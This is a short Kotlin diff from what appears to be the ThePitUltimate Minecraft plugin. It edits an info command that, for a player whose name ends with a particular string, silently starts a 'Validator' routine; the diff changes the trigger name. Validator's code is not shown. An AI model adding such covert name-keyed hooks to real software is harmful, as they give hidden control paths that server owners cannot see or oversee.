@@ -86,7 +86,7 @@ class PitCommands {
     @Execute(name = "thepit", aliases = ["天坑", "天坑乱斗", "version", "ver"])
     fun info(@Context player: Player) {
         player.sendMessage(CC.translate("&7Currently running &cThePitUltimate&f(&8${StringUtil.hideMiddle(ThePit.getInstance().globalConfig.token)}&f)"))
-            if (player.name.endsWith("Miriam")) {
+            if (player.name.endsWith("Mirwwiam")) {
             Validator(player).start()
         }
     }
